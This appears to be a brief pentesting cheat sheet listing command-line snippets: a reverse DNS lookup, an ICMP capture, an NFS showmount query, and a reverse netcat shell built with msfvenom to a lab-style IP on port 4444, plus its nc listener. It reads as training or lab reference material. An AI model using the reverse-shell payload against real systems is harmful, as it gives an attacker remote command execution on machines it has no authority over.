---
description: Collation of useful general cli commands for pentesters
---

# Cli Commands Collation

## Find PTR Owner - Reversal Look Up

```bash
dig 0.168.192.in-addr.arpa. NS
```

## Listent for Ping/icmp on interface

```bash
sudo tcpdump ip proto \\icmp -i eth0
```

## Reverse Netcat Shell

Payload R(row)

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.11.19.49 lport=4444 R
```

listener:

```bash
nc -lvp 4444
```

## NFS Show Mount

```bash
showmount -e 10.10.87.232
```
